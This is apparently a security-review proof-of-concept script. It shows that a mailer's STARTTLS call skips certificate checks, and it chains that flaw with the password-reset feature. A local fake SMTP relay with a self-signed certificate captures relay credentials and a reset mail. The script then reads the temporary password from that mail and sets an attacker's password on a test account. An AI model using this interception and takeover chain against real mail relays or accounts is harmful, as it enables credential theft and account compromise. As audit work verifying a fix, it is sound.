"""R6: Mailer.send calls smtp.starttls() with no SSL context, so Python uses
ssl._create_stdlib_context() (= _create_unverified_context): the relay's
certificate is not checked. Anyone who can answer for the relay's host name
or sit on the path (DNS, routing) gets the SMTP credentials and every mail,
including the temporary password a reset mails. Chained with "reset" (which
anyone can ask for any name with an address on file), that is a takeover of
any account with an address.

Here a fake relay on 127.0.0.1 with a self-signed certificate for an
unrelated name stands in for the attacker. Local only. With the fix (the
relay's certificate verified) the relay gets nothing and the reset is refused
with ERR NOMAIL. Nothing read from a mail is printed.

    python3.13 review/r6_smtp_mitm.py
"""
import asyncio
import base64
import email
import os
import re
import ssl
import subprocess
import tempfile

from harness import Client, Stack

PASSWORD = "Alice's own 1"


def self_signed(d):
    key, crt = os.path.join(d, "k.pem"), os.path.join(d, "c.pem")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", crt,
                    "-days", "1", "-subj", "/CN=attacker.invalid"], check=True, capture_output=True)
    return crt, key


class FakeRelay:
    def __init__(self, crt, key):
        self.ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ctx.load_cert_chain(crt, key)
        self.creds, self.mails = [], []

    async def handle(self, r, w):
        async def say(t):
            w.write((t + "\r\n").encode())
            await w.drain()
        await say("220 relay ESMTP")
        data = None
        while True:
            line = await r.readline()
            if not line:
                return
            l = line.decode().rstrip("\r\n")
            u = l.upper()
            if data is not None:
                if l == ".":
                    self.mails.append("\n".join(data))
                    data = None
                    await say("250 queued")
                else:
                    data.append(l)
                continue
            if u.startswith("EHLO"):
                await say("250-relay\r\n250-STARTTLS\r\n250 AUTH PLAIN LOGIN")
            elif u == "STARTTLS":
                await say("220 go ahead")
                await w.start_tls(self.ctx)
            elif u.startswith("AUTH PLAIN"):
                self.creds.append(base64.b64decode(l.split()[2]).split(b"\0"))
                await say("235 ok")
            elif u.startswith("DATA"):
                data = []
                await say("354 go")
            elif u.startswith("QUIT"):
                await say("221 bye")
                return
            else:
                await say("250 ok")


async def main():
    d = tempfile.mkdtemp()
    relay = FakeRelay(*self_signed(d))
    srv = await asyncio.start_server(relay.handle, "127.0.0.1", 0)
    rport = srv.sockets[0].getsockname()[1]
    s = Stack("password", "email", settings={"email.transport": "smtp", "email.smtp_host": "127.0.0.1",
                                         "email.smtp_port": str(rport), "email.smtp_user": "relay-user",
                                         "email.smtp_password": "relay-password-123",
                                         "email.from": "noreply@parlornet.example"})
    s.seed("alice", password=PASSWORD, email="alice@example.org")
    s.start()
    try:
        c = await Client.connect(s.core)
        await c.req("HELO alice")
        await c.req("AUT password reset")          # anyone may ask; the password goes to alice's address...
        await asyncio.sleep(0.5)
        print("relay credentials seen by the fake relay:", bool(relay.creds))
        if not relay.mails:
            print("the relay got no mail (the certificate is checked): the takeover fails closed")
            return
        msg = email.message_from_string(relay.mails[0])
        body = next(part for part in msg.walk() if part.get_content_type() == "text/plain")
        temp = re.search(r"Password:\s+(\S+)", body.get_payload(decode=True).decode()).group(1)
        print("temporary password read from the mail: yes (not shown)")
        await c.req("HELO alice")
        await c.req("AUT password %s" % temp)      # ...but the attacker read it on the way
        await c.req("AUT password Attacker's 1")
        await c.req("AUT confirm Attacker's 1")
        await c.req("LST")
        c.close()
    finally:
        s.stop()
        srv.close()


if __name__ == "__main__":
    asyncio.run(main())
